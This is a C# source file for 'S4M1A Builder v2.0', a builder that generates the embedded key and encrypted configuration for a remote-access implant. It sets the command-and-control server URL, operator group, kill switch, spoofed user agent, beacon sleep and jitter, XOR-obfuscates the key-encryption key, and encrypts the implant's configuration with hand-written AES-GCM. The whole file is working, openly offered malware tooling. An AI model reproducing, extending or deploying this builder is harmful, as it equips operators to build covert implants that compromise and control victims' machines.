using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace S4M1A.Build
{
    // =====================================================================
    //  S4M1A Builder v2.0 - generates src/Implant/EmbeddedKey.cs
    //
    //  Usage:
    //    Builder.exe gencfg     -> writes build.json template
    //    Builder.exe            -> builds using build.json
    //
    //  build.json schema:
    //  {
    //    "implant_dir": "..\\Implant",
    //    "server":   "https://192.0.2.10:443/",
    //    "group":    "ops",
    //    "kill":     "s4m1a-kill",
    //    "ua":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
    //    "proxy":    "",              // "" = system proxy
    //    "sleep_ms": 30000,
    //    "jitter_pct": 20,
    //    "kek_hex":  "<32-byte KEK hex = build_key from panel_secrets.json>"
    //  }
    //
    //  What it does:
    //    1. KEK from kek_hex; BuildId = random 16 hex; Obf = KEK xor BuildId
    //    2. Config JSON encrypted with KEK via AES-256-GCM ->
    //       ConfigBlobB64 = b64( iv(12) || ct || tag(16) )      SYNC A
    //    3. Regenerates src\Implant\EmbeddedKey.cs with the new
    //       Obf/BuildId + all build constants.
    //
    //  SYNC contract (implant side):
    //    - Crypto.UnwrapBuildKey(EmbeddedKey.Obf, EmbeddedKey.BuildId)
    //      must yield the 32-byte KEK (XOR scheme below).
    //    - Config.cs / Network.cs wire Config.Current.X from
    //      EmbeddedKey.ServerUrl/.Group/.Kill/.Ua/.Proxy/.SleepMs/
    //      .JitterPct/.Id (edit Config.cs once to read these).
    //    - Config unwrap at implant startup expects b64(iv||ct||tag);
    //      if Crypto.cs uses a different layout change MakeConfigBlob.
    // =====================================================================

    public static class Program
    {
        private const string ConfigFile = "build.json";

        public static int Main(string[] args)
        {
            Console.Title = "S4M1A Builder v2.0";
            try
            {
                if (args.Length > 0 && args[0].ToLowerInvariant() == "gencfg")
                    return GenCfg();

                if (!File.Exists(ConfigFile))
                {
                    Console.WriteLine("[!] missing " + ConfigFile +
                                      " (run: Builder.exe gencfg)");
                    return 2;
                }

                Dictionary<string, string> cfg = ReadJson(ConfigFile);
                string implantDir = Str(cfg, "implant_dir", @"..\Implant");
                string server = Need(cfg, "server");
                string group = Str(cfg, "group", "");
                string kill = Str(cfg, "kill", "s4m1a-kill");
                string ua = Str(cfg, "ua",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                string proxy = Str(cfg, "proxy", "");
                int sleepMs = Int(cfg, "sleep_ms", 30000);
                int jitter = Int(cfg, "jitter_pct", 20);
                string keHex = Need(cfg, "kek_hex").Replace("-", "").Replace(" ", "");

                byte[] kek = Hex(keHex);
                if (kek == null || kek.Length != 32)
                {
                    Console.WriteLine("[!] kek_hex must be exactly 64 hex chars (32 bytes)");
                    return 2;
                }

                string id = Guid.NewGuid().ToString("N");
                string buildId = RandHex(8);                    // 16 hex chars
                byte[] obf = Xor(kek, buildId);

                string json = BuildConfigJson(server, group, kill, ua,
                                              proxy, sleepMs, jitter, id);
                byte[] blob = MakeConfigBlob(kek, json);        // SYNC A
                string blobB64 = Convert.ToBase64String(blob);

                string outPath = Path.Combine(implantDir, "EmbeddedKey.cs");
                WriteEmbeddedKey(outPath, obf, buildId, id, server, group, kill,
                                 ua, proxy, sleepMs, jitter, blobB64);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] wrote " + outPath);
                Console.ResetColor();
                Console.WriteLine("[+] id         : " + id);
                Console.WriteLine("[+] server     : " + server);
                Console.WriteLine("[+] group      : " + group);
                Console.WriteLine("[+] sleep/jit  : " + sleepMs + " ms / " +
                                  jitter + " %");
                Console.WriteLine("[+] config b64 : " + blobB64.Length + " chars");
                Console.WriteLine("[+] next       : run build.bat");
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] " + ex.Message);
                return 1;
            }
        }

        // =================================================================
        //  Config generation
        // =================================================================

        private static int GenCfg()
        {
            if (File.Exists(ConfigFile))
            {
                Console.WriteLine("[!] " + ConfigFile + " already exists");
                return 1;
            }
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("{");
            sb.AppendLine("  \"implant_dir\": \"..\\\\Implant\",");
            sb.AppendLine("  \"server\": \"https://192.0.2.10:443/\",");
            sb.AppendLine("  \"group\": \"ops\",");
            sb.AppendLine("  \"kill\": \"s4m1a-kill\",");
            sb.AppendLine("  \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",");
            sb.AppendLine("  \"proxy\": \"\",");
            sb.AppendLine("  \"sleep_ms\": 30000,");
            sb.AppendLine("  \"jitter_pct\": 20,");
            sb.AppendLine("  \"kek_hex\": \"REPLACE_WITH_64_HEX_FROM_PANEL_SECRETS_BUILD_KEY\"");
            sb.AppendLine("}");
            File.WriteAllText(ConfigFile, sb.ToString(), Encoding.UTF8);
            Console.WriteLine("[+] wrote " + ConfigFile);
            Console.WriteLine("[+] set kek_hex = build_key from panel_secrets.json");
            Console.WriteLine("[+] set server/group/kill/ua to the build values");
            Console.WriteLine("[+] then run: build.bat");
            return 0;
        }

        private static string BuildConfigJson(string server, string group, string kill,
            string ua, string proxy, int sleepMs, int jitter, string id)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{\"server\":\"").Append(Escape(server));
            sb.Append("\",\"group\":\"").Append(Escape(group));
            sb.Append("\",\"kill\":\"").Append(Escape(kill));
            sb.Append("\",\"ua\":\"").Append(Escape(ua));
            sb.Append("\",\"proxy\":\"").Append(Escape(proxy));
            sb.Append("\",\"sleep_ms\":").Append(sleepMs.ToString(CultureInfo.InvariantCulture));
            sb.Append(",\"jitter_pct\":").Append(jitter.ToString(CultureInfo.InvariantCulture));
            sb.Append(",\"id\":\"").Append(Escape(id)).Append("\"}");
            return sb.ToString();
        }

        // ---------------------------------------------------------------
        //  Config blob (SYNC A): iv(12) || ct || tag(16), AES-256-GCM(KEK)
        // ---------------------------------------------------------------
        private static byte[] MakeConfigBlob(byte[] kek, string json)
        {
            byte[] pt = Encoding.UTF8.GetBytes(json);
            byte[] iv = RandomBytes(12);
            byte[] ct = Gcm.Encrypt(kek, iv, pt);
            byte[] blob = new byte[12 + ct.Length];
            Buffer.BlockCopy(iv, 0, blob, 0, 12);
            Buffer.BlockCopy(ct, 0, blob, 12, ct.Length);
            return blob;
        }

        // =================================================================
        //  EmbeddedKey.cs writer
        // =================================================================

        private static void WriteEmbeddedKey(string path, byte[] obf, string buildId,
            string id, string server, string group, string kill, string ua,
            string proxy, int sleepMs, int jitter, string blobB64)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("using System;");
            sb.AppendLine();
            sb.AppendLine("namespace S4M1A.Implant");
            sb.AppendLine("{");
            sb.AppendLine("    // AUTO-GENERATED by src/Build/Builder.cs - do not edit by hand.");
            sb.AppendLine("    public static class EmbeddedKey");
            sb.AppendLine("    {");
            sb.AppendLine("        // Obf[i] = KEK[i] ^ BuildId[i % BuildId.Length]");
            sb.AppendLine("        public static readonly byte[] Obf = new byte[] {");
            sb.AppendLine(ByteArrayLiteral(obf, "            "));
            sb.AppendLine("        };");
            sb.AppendLine("        public const string BuildId = \"" +
                          Escape(buildId) + "\";");
            sb.AppendLine();
            sb.AppendLine("        // ---- build info (Config.cs / Network.cs read these) ----");
            sb.AppendLine("        public const string Id = \"" + Escape(id) + "\";");
            sb.AppendLine("        public const string ServerUrl = \"" +
                          Escape(server) + "\";");
            sb.AppendLine("        public const string Group = \"" + Escape(group) + "\";");
            sb.AppendLine("        public const string Kill = \"" + Escape(kill) + "\";");
            sb.AppendLine("        public const string Ua = \"" + Escape(ua) + "\";");
            sb.AppendLine("        public const string Proxy = \"" + Escape(proxy) + "\";");
            sb.AppendLine("        public const int SleepMs = " +
                          sleepMs.ToString(CultureInfo.InvariantCulture) + ";");
            sb.AppendLine("        public const int JitterPct = " +
                          jitter.ToString(CultureInfo.InvariantCulture) + ";");
            sb.AppendLine("        public const string ConfigBlobB64 = \"" +
                          Escape(blobB64) + "\";");
            sb.AppendLine("    }");
            sb.AppendLine("}");
            File.WriteAllText(path, sb.ToString(), new UTF8Encoding(false));
        }

        private static string ByteArrayLiteral(byte[] data, string indent)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < data.Length; i++)
            {
                if (i % 12 == 0) sb.Append(indent);
                sb.Append("0x").Append(data[i].ToString("x2"));
                if (i != data.Length - 1) sb.Append(", ");
                if (i % 12 == 11) sb.AppendLine();
            }
            sb.AppendLine();
            return sb.ToString();
        }

        // =================================================================
        //  Audience: flat JSON read (no external JSON lib needed)
        // =================================================================

        private static Dictionary<string, string> ReadJson(string path)
        {
            string s = File.ReadAllText(path, Encoding.UTF8);
            Dictionary<string, string> d = new Dictionary<string, string>();
            for (int i = 0; i < s.Length; i++)
            {
                if (s[i] != '"') continue;
                int end = s.IndexOf('"', i + 1);
                if (end < 0) break;
                string key = s.Substring(i + 1, end - i - 1);
                int j = end + 1;
                while (j < s.Length && (s[j] == ' ' || s[j] == '\t' ||
                       s[j] == '\r' || s[j] == '\n' || s[j] == ':')) j++;
                if (j >= s.Length) break;

                string val = "";
                if (s[j] == '"')
                {
                    int end2 = s.IndexOf('"', j + 1);
                    if (end2 < 0) break;
                    val = s.Substring(j + 1, end2 - j - 1);
                    i = end2;
                }
                else
                {
                    int k = j;
                    while (k < s.Length && s[k] != ',' && s[k] != '}' &&
                           s[k] != '\r' && s[k] != '\n') k++;
                    val = s.Substring(j, k - j).Trim();
                    i = k - 1;
                }
                d[key] = val;
            }
            return d;
        }

        // =================================================================
        //  Helpers
        // =================================================================

        private static string Need(Dictionary<string, string> d, string key)
        {
            string v;
            if (!d.TryGetValue(key, out v) || string.IsNullOrEmpty(v))
                throw new Exception("build.json missing: " + key);
            return v;
        }

        private static string Str(Dictionary<string, string> d, string key, string def)
        {
            string v;
            return d.TryGetValue(key, out v) ? v : def;
        }

        private static int Int(Dictionary<string, string> d, string key, int def)
        {
            string v;
            int r;
            if (!d.TryGetValue(key, out v) || !int.TryParse(v,
                NumberStyles.Integer, CultureInfo.InvariantCulture, out r))
                return def;
            return r;
        }

        private static string Escape(string s)
        {
            if (s == null) return "";
            StringBuilder sb = new StringBuilder();
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"':  sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static byte[] Xor(byte[] kek, string buildId)
        {
            byte[] k = Encoding.ASCII.GetBytes(buildId);
            byte[] o = new byte[kek.Length];
            for (int i = 0; i < kek.Length; i++)
                o[i] = (byte)(kek[i] ^ k[i % k.Length]);
            return o;
        }

        private static byte[] Hex(string s)
        {
            if (string.IsNullOrEmpty(s) || s.Length % 2 != 0) return null;
            byte[] b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
            {
                int hi = HexNib(s[i * 2]);
                int lo = HexNib(s[i * 2 + 1]);
                if (hi < 0 || lo < 0) return null;
                b[i] = (byte)((hi << 4) | lo);
            }
            return b;
        }

        private static int HexNib(char c)
        {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return -1;
        }

        private static string RandHex(int bytes)
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte b in RandomBytes(bytes))
                sb.Append(b.ToString("x2"));
            return sb.ToString();
        }

        private static byte[] RandomBytes(int n)
        {
            byte[] b = new byte[n];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                rng.GetBytes(b);
            return b;
        }
    }

    // =====================================================================
    //  AES-256-GCM (hand-rolled, interops with standard GCM)
    // =====================================================================
    internal static class Gcm
    {
        private const int Br = 16;

        public static byte[] Encrypt(byte[] key, byte[] iv, byte[] plain)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] ct = CounterCipher(enc, j0, plain);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            byte[] o = new byte[ct.Length + Br];
            Buffer.BlockCopy(ct, 0, o, 0, ct.Length);
            Buffer.BlockCopy(t, 0, o, ct.Length, Br);
            return o;
        }

        public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ct, byte[] tag)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            if (!Equal(t, tag)) return null;
            return CounterCipher(enc, j0, ct);
        }

        private static ICryptoTransform Aes(byte[] key)
        {
            System.Security.Cryptography.Aes aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256;
            aes.Key = key;
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.None;
            return aes.CreateEncryptor();
        }

        private static byte[] BlockEnc(ICryptoTransform enc, byte[] b)
        {
            byte[] o = new byte[Br];
            enc.TransformBlock(b, 0, Br, o, 0);
            return o;
        }

        private static byte[] MakeJ0(byte[] iv)
        {
            byte[] j0 = new byte[Br];
            Buffer.BlockCopy(iv, 0, j0, 0, 12);
            j0[15] = 1;
            return j0;
        }

        private static void Inc32(byte[] c)
        {
            for (int i = 15; i >= 12; i--)
                if (++c[i] != 0) return;
        }

        private static byte[] CounterCipher(ICryptoTransform enc, byte[] j0, byte[] data)
        {
            byte[] ctr = (byte[])j0.Clone();
            Inc32(ctr);
            byte[] o = new byte[data.Length];
            for (int off = 0; off < data.Length; off += Br)
            {
                byte[] s = BlockEnc(enc, ctr);
                int n = Math.Min(Br, data.Length - off);
                for (int i = 0; i < n; i++) o[off + i] = (byte)(data[off + i] ^ s[i]);
                Inc32(ctr);
            }
            return o;
        }

        private static byte[] Ghash(byte[] h, byte[] ct)
        {
            byte[] y = new byte[Br];
            AddBlocks(h, ct, y);
            byte[] len = new byte[Br];
            PutU64(len, 0, 0);
            PutU64(len, 8, (ulong)ct.Length * 8);
            Mul(Xor16(y, len), h, y);
            return y;
        }

        private static void AddBlocks(byte[] h, byte[] data, byte[] y)
        {
            if (data == null || data.Length == 0) return;
            int i = 0;
            for (; i + Br <= data.Length; i += Br)
                Mul(Xor16(y, Slice(data, i, Br)), h, y);
            if (i < data.Length)
            {
                byte[] last = new byte[Br];
                Buffer.BlockCopy(data, i, last, 0, data.Length - i);
                Mul(Xor16(y, last), h, y);
            }
        }

        // GF(2^128) multiply: z = a * b  (R = x^128 + x^7 + x^2 + x + 1)
        private static void Mul(byte[] a, byte[] b, byte[] z)
        {
            byte[] v = (byte[])b.Clone();
            byte[] r = new byte[Br];
            for (int i = 0; i < 128; i++)
            {
                if ((a[i >> 3] & (byte)(0x80 >> (i & 7))) != 0)
                    XorEq(r, v);
                bool lsb = (v[15] & 1) != 0;
                for (int k = 15; k > 0; k--)
                    v[k] = (byte)((v[k] >> 1) | ((v[k - 1] & 1) << 7));
                v[0] = (byte)(v[0] >> 1);
                if (lsb) v[0] ^= 0xE1;
            }
            Buffer.BlockCopy(r, 0, z, 0, Br);
        }

        private static void PutU64(byte[] b, int off, ulong v)
        {
            for (int i = off + 7; i >= off; i--) { b[i] = (byte)(v & 0xFF); v >>= 8; }
        }

        private static byte[] Xor16(byte[] a, byte[] b)
        {
            byte[] r = new byte[Br];
            for (int i = 0; i < Br; i++) r[i] = (byte)(a[i] ^ b[i]);
            return r;
        }

        private static void XorEq(byte[] a, byte[] b)
        {
            for (int i = 0; i < Br; i++) a[i] ^= b[i];
        }

        private static bool Equal(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int d = 0;
            for (int i = 0; i < a.Length; i++) d |= a[i] ^ b[i];
            return d == 0;
        }

        private static byte[] Slice(byte[] s, int off, int n)
        {
            byte[] r = new byte[n];
            Buffer.BlockCopy(s, off, r, 0, n);
            return r;
        }
    }
}